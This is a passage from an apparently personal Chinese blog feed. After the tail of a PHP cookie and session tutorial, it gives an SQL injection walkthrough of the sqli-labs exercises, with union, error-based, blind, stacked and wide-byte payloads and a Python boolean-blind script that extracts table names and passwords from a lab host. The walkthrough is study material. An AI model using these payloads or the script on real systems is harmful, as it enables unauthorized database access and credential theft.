class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="删除Cookie"><a href="#删除Cookie" class="headerlink" title="删除Cookie"></a>删除Cookie</h4><p>将开头的时间设置为过期时间即可</p><p>完整代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;pq&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">5</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;P&gt;HELLO,&lt;/P&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Cookie isn&#x27;t exists&quot;</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h3><h4 id="启动会话"><a href="#启动会话" class="headerlink" title="启动会话"></a>启动会话</h4><p>在设置session之前，必须启动会话，如下：</p><p><code>&lt;?php session_start(); ?&gt;</code></p><p>须知：session_start()必须位于<html>标签之前。</p><h4 id="储存Session"><a href="#储存Session" class="headerlink" title="储存Session"></a>储存Session</h4><blockquote><p>存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量</p></blockquote><h4 id="销毁-Session"><a href="#销毁-Session" class="headerlink" title="销毁 Session"></a>销毁 Session</h4><p>使用 unset() 或 session_destroy() 函数。</p><p>unset() 函数用于释放指定的 session 变量， session_destroy() 函数彻底销毁 session。</p><p>完整代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;pq&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;HELLO&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入入门</title>
      <link href="/2024/03/18/SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="判断字符型或者数字型注入"><a href="#判断字符型或者数字型注入" class="headerlink" title="判断字符型或者数字型注入"></a>判断字符型或者数字型注入</h3><p>字符型：</p><p>&#x2F;?id&#x3D; 1’ and ‘1’&#x3D;‘1 正确</p><p>&#x2F;?id&#x3D; 1’ and ‘1’&#x3D;‘2’ 语义错误（非语法错误）</p><p>数字型：</p><p>&#x2F;?id&#x3D; 1 and 1&#x3D;1 正确</p><p>&#x2F;?id&#x3D; 1 and 1&#x3D; 2 语义错误（非语法错误）</p><h3 id="记忆"><a href="#记忆" class="headerlink" title="记忆"></a>记忆</h3><p>核心数据库：information_schema</p><p>其中的表：schema, tables, columns</p><p>其中的列：</p><p>schema：schemata</p><p>tables：table_schema</p><p>columns：table_name</p><h3 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h3><blockquote><p><em><strong>*updatexml()函数的使用：更新xml文档的函数，返回替换的XML片段*</strong></em></p><p><em><strong>*语法：updatexml（xml_documat，XPath_string，new_value）*</strong></em></p><p>参数：1xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。</p><p>2XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。</p><p>3new_value：是string格式替换查找到符合条件的数据，在注入时可以加入任意字符，比如0x26（&amp;）。</p></blockquote><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>GET：–+</p><p>POST：#</p><p>附：如果是GET想用#，则先进行URL编码：%23</p><h3 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h3><h4 id="select过滤"><a href="#select过滤" class="headerlink" title="select过滤"></a>select过滤</h4><p>查库：show database();</p><p>查表：show tables；</p><p>查列：desc table_name;</p><p>查数据：看来必须要用select关键字，直接预编译：</p><blockquote><p>@预定义prepare模板</p><p>prepare xxx as select * from user where id&#x3D;1;  &#x2F;&#x2F;将select查询语句定义为xxx</p><p>execute xxx;  &#x2F;&#x2F;再使用execute来执行这个变量xxx即可执行上诉的select查询语句</p><p>所以本题，先是使用prepare来预定义@a语句为hello，然后再使用execute来执行hello，这里execute执行的就是@a语句。</p></blockquote><p>举个栗子：0’;sEt@a&#x3D;concat(“sel”,”ect flag from  <code>1919810931114514</code>“);PRepare hello from @a;execute hello;#</p><blockquote><p>这里是通过concat函数将查询语句进行连接，然后赋值给变量@a，然后再通过prepare来预定义@a的查询语句为hello，最后再使用execute来执行hello。</p></blockquote><h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><p>联合注入</p><p>报错注入</p><p>布尔盲注</p><p>时间盲注</p><p>头部注入</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>该注入需要特殊的条件，比如函数：mysqli_multi_query()，其可以执行一条或多条SQL语句。</p><p>使用格式也简单，用分号**;**闭合语句，再写入一条语句。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>推荐文章：<a href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote><p><strong>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</strong><br><strong>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</strong></p></blockquote><p>须知：二次注入并不会马上生效，正如其名，会在下次相关SQL语句执行时生效。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>推荐文章：<a href="https://blog.csdn.net/m0_46467017/article/details/126247133">https://blog.csdn.net/m0_46467017/article/details/126247133</a></p><h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>宽字节：如果一个字符的大小为两个字节，则称之为宽字节。</p><blockquote><p>像<strong>GB2321、GBK、GB18030、BIG5、Shift_JIS</strong>等这些编码都是常说的宽字节，也就是只有两个字节。<br>英文默认占一个字节，中午占两个字节。</p></blockquote><h4 id="宽字节注入的条件"><a href="#宽字节注入的条件" class="headerlink" title="宽字节注入的条件"></a>宽字节注入的条件</h4><ol><li>数据库为GBK编码</li><li>使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符\进行转义</li></ol><p>具体看Less-32，我写得尽量详细一点</p><h2 id="sqlilab"><a href="#sqlilab" class="headerlink" title="sqlilab"></a>sqlilab</h2><h3 id="Less-1-Less-2"><a href="#Less-1-Less-2" class="headerlink" title="Less-1 Less-2"></a>Less-1 Less-2</h3><p>tip：最基本的整数型与字符型注入</p><p>1.判断GET还是POST</p><p>&#x2F;?id&#x3D;1</p><p>2.是否有单引号闭合</p><p>在基础模块（上文）有提及，不赘述</p><p>3.判断占位数</p><p>&#x2F;?id&#x3D;1 order by 1正确</p><p>&#x2F;?id&#x3D;1 order by 2正确</p><p>&#x2F;?id&#x3D;1 order by 3正确</p><p>&#x2F;?id&#x3D;1 order by 4报错</p><p>4.查看显示位</p><p>太简单，不赘述</p><p>5.爆数据（有单引号闭合的自行加入，下文默认数字型）</p><p>爆库：</p><p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(schema_name) from information_schema. –+  </p><p>爆表：</p><p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘HHH’  –+ </p><p>爆列：</p><p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘HHH’  –+ </p><p>爆值：</p><p>&#x2F;?id&#x3D;-1 union select group_concat(id, pq, ···) from hhhh –+</p><h3 id="Less-3-Less-4"><a href="#Less-3-Less-4" class="headerlink" title="Less-3 Less-4"></a>Less-3 Less-4</h3><p>tip：这两关有小括号闭合</p><p>测试：</p><p>&#x2F;?id &#x3D; 1正常</p><p>&#x2F;?id &#x3D; 1’报错，小括号闭合</p><p>应对方式：</p><p>&#x2F;?id&#x3D; -1) –+ </p><p>其他与前两关一致</p><h3 id="Less-5-Less-6"><a href="#Less-5-Less-6" class="headerlink" title="Less-5 Less-6"></a>Less-5 Less-6</h3><p>tip：报错注入</p><p>测试：</p><p>&#x2F;?id&#x3D;1正常，不显示信息</p><p>&#x2F;?id&#x3D;-1报错</p><p>利用updataxml()函数（基础模块有介绍）</p><p>闭合方式：</p><p>Less-5是单引号闭合</p><p>Less-6是双引号闭合</p><p>爆库：</p><p>&#x2F;?id&#x3D;1’ and updatexml(1,concat(0x7e,mid((select group_concat(schema_name) from information_schema.schemata),1,31)),1) –+ </p><p>爆表：</p><p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘HHH’),1,31)),1) –+ </p><p>爆列：</p><p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(column_name) from information_schema.columns where table_sname&#x3D;‘HHH’),1,31)),1) –+ </p><p>爆值：</p><p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(id···) from hhh),1,31)),1) –+ </p><h3 id="Less-7-Less-8"><a href="#Less-7-Less-8" class="headerlink" title="Less-7 Less-8"></a>Less-7 Less-8</h3><p>tip：布尔盲注，本次以Less-8为主</p><p>存在单引号闭合</p><h4 id="布尔盲注步骤详解"><a href="#布尔盲注步骤详解" class="headerlink" title="布尔盲注步骤详解"></a>布尔盲注步骤详解</h4><p>页面只能返回正确或错误，无法报错注入。</p><p>步骤：对数据库，表，列都一样，有以下几步</p><ol><li>确定值的个数</li><li>确定一个值的长度</li><li>确定一个值的组成</li></ol><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>由于操作量太大，我们只从security-&gt;users-&gt;id</p><h5 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h5><h6 id="个数"><a href="#个数" class="headerlink" title="个数"></a>个数</h6><h6 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length(database()) &gt; 7 –+ true</p><p>&#x2F;?id&#x3D;1’ and length(database()) &gt; 8 –+语义错误</p><p>可知长度为8</p><h6 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((database()),1,1)) &gt; 97 –+ </p><p>······</p><p>得知当前数据库：security</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><h6 id="个数-1"><a href="#个数-1" class="headerlink" title="个数"></a>个数</h6><p>&#x2F;?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database()) &gt; 3 –+ 正确</p><p>&#x2F;?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database()) &gt; 4 –+ 语义错误</p><p>可知有四个表：emails,referers,uagents,users</p><h6 id="长度-1"><a href="#长度-1" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1)) &gt; 5 –+ 正确</p><p>&#x2F;?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1)) &gt; 6 –+ 语言错误</p><p>可知第四个表长度为5</p><h6 id="组成-1"><a href="#组成-1" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1),1,1)) &gt; 97 –+ </p><p>可知表为users</p><h5 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h5><h6 id="个数-2"><a href="#个数-2" class="headerlink" title="个数"></a>个数</h6><p>&#x2F;?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’) &gt; 2 –+ 正确</p><p>&#x2F;?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’) &gt; 3 –+ 语义错误</p><p>可知三个列:id,username,password</p><h6 id="长度-2"><a href="#长度-2" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0, 1))  &#x3D; 2 –+ </p><h6 id="组成-2"><a href="#组成-2" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0, 1),1,1)) &gt; 97 –+</p><p>可知列：id</p><h5 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h5><h6 id="个数-3"><a href="#个数-3" class="headerlink" title="个数"></a>个数</h6><p>?id&#x3D;1’ and (select count(*) from users) &gt; 12 –+ 正确</p><p>?id&#x3D;1’ and (select count(*) from users) &gt; 13 –+ 语义报错</p><p>可知有十三个</p><p>长度，组成不赘述</p><h4 id="布尔盲注python脚本"><a href="#布尔盲注python脚本" class="headerlink" title="布尔盲注python脚本"></a>布尔盲注python脚本</h4><p>以Less-8为例(手搓，巨费时)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">global</span> _database_name</span><br><span class="line"><span class="keyword">global</span> urlOpen</span><br><span class="line"><span class="keyword">global</span> mark</span><br><span class="line"><span class="keyword">global</span> _<span class="built_in">list</span></span><br><span class="line">_<span class="built_in">list</span> = []</span><br><span class="line"><span class="comment">#_list = [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span></span><br><span class="line">urlOpen = <span class="string">&quot;http://124.70.99.199:81/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">mark = <span class="string">&#x27;You are in...........&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">            url = urlOpen + <span class="string">f&quot;and ascii(substr(database(),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;i&#125;</span> --+ &quot;</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Not found for <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="comment">#print(url)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;No match found for position <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line">    _database_name = name</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#有几个表</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">12</span>):<span class="comment">#一个表有几个字</span></span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):<span class="comment">#一个字是什么字</span></span><br><span class="line">                url = urlOpen + <span class="string">f&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit <span class="subst">&#123;i&#125;</span>, 1),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;y&#125;</span> --+ &quot;</span></span><br><span class="line">                <span class="comment">#print(url)</span></span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + <span class="built_in">chr</span>(y)</span><br><span class="line">                    <span class="comment">#print(name)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        _<span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>, _<span class="built_in">list</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;表函数已结束&#x27;</span>)</span><br><span class="line">table_name()</span><br><span class="line"><span class="comment">#[&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span></span><br><span class="line"><span class="comment">#选一个</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>():</span><br><span class="line">    list_1 = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        list_2 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">            name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">                    url = urlOpen + <span class="string">f&quot;and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;_<span class="built_in">list</span>[a]&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>, 1),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;y&#125;</span> --+ &quot;</span></span><br><span class="line">                    r = requests.get(url)</span><br><span class="line">                    <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                        name = name + <span class="built_in">chr</span>(y)</span><br><span class="line">                        <span class="built_in">print</span>(name)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;y&#125;</span> 不是&#x27;</span>)</span><br><span class="line">            list_2.append(name)</span><br><span class="line">        <span class="built_in">print</span>(list_2)</span><br><span class="line">        list_1.append(list_2)</span><br><span class="line">    <span class="built_in">print</span>(list_1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#选择一个值</span></span><br><span class="line">table_value = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">column_value = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">value</span>(<span class="params">table_value, column_value</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">            url = urlOpen + <span class="string">f&quot;and ascii(substr((select <span class="subst">&#123;column_value&#125;</span> from <span class="subst">&#123;table_value&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)) = <span class="subst">&#123;j&#125;</span> --+ &quot;</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>不是&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&#x27;press enter to&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;database_name&#x27;</span>:</span><br><span class="line">        database_name()</span><br><span class="line">    <span class="keyword">elif</span> a == <span class="string">&#x27;table_name&#x27;</span>:</span><br><span class="line">        table_name()</span><br><span class="line">    <span class="keyword">elif</span> a == <span class="string">&#x27;column_value&#x27;</span>:</span><br><span class="line">        column_name()</span><br><span class="line">    <span class="keyword">elif</span> a == <span class="string">&quot;value&quot;</span>:</span><br><span class="line">        table_value = <span class="built_in">input</span>(<span class="string">&#x27;give me the table&#x27;</span>)</span><br><span class="line">        column_value = <span class="built_in">input</span>(<span class="string">&#x27;give me the column&#x27;</span>)</span><br><span class="line">        value(table_value, column_value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;invalid input&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Less-9-Less10"><a href="#Less-9-Less10" class="headerlink" title="Less-9 Less10"></a>Less-9 Less10</h3><p>tip：时间盲注，本次以Less-9为主</p><p>存在单引号闭合</p><p>简单介绍一下if语法即可：</p><p>语法：<code>if(expr1，expr2，expr3)</code></p><p> 语法含义：如果expr1是true，则if()的返回值为expr2，否则返回值则为expr3。</p><p>例子：</p><p>&#x2F;?id&#x3D;1’ and  if((1&#x3D;1), sleep(10),1)</p><p>迫于时间压力，先不学时间盲注脚本</p><h3 id="Less-11-Less-12"><a href="#Less-11-Less-12" class="headerlink" title="Less-11 Less-12"></a>Less-11 Less-12</h3><p>tip：POST提交方式</p><p>本次以Less-11 为主，两关区别是单引号或双引号闭合</p><p>用POST提交</p><p>剩下的一样</p><h3 id="Less-13-Less-14"><a href="#Less-13-Less-14" class="headerlink" title="Less-13 Less-14"></a>Less-13 Less-14</h3><p>本次以Less-13 为主，两关区别是单引号加小括号或双引号闭合</p><p>附：测试时返回这样一句话：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1’) LIMIT 0,1’ at line 1</p><p>其中的“o use near ‘1’) LIMIT 0,1’”告诉我们闭合方式是(‘’),Less-14同理</p><p>输入正确无反应，采用报错或盲注，本次为报错注入</p><p>例子：</p><p>passwd&#x3D;1&amp;uname&#x3D;1’) and updatexml(1,concat(0x7e, mid(database(),1,31)),1) #</p><p>可以报错注入，剩下照旧</p><h3 id="Less-15-Less-16"><a href="#Less-15-Less-16" class="headerlink" title="Less-15 Less-16"></a>Less-15 Less-16</h3><p>不管正确还是错误都没有回显，只能使用时间盲注</p><p>我会补脚本的，其实还有一个问题，就是如何在没有信息的情况下得知闭合方式，不要看source的那种</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>源码提示uname参数不可用，使用passwd参数</p><p>使用报错注入</p><h3 id="小结-基本注入"><a href="#小结-基本注入" class="headerlink" title="小结(基本注入)"></a>小结(基本注入)</h3><h4 id="联合注入："><a href="#联合注入：" class="headerlink" title="联合注入："></a>联合注入：</h4><p>联合注入要求前面的条件是错的，需要注意占位数，回显位</p><p>当输入正确时有回显，可以使用联合注入</p><h4 id="报错注入："><a href="#报错注入：" class="headerlink" 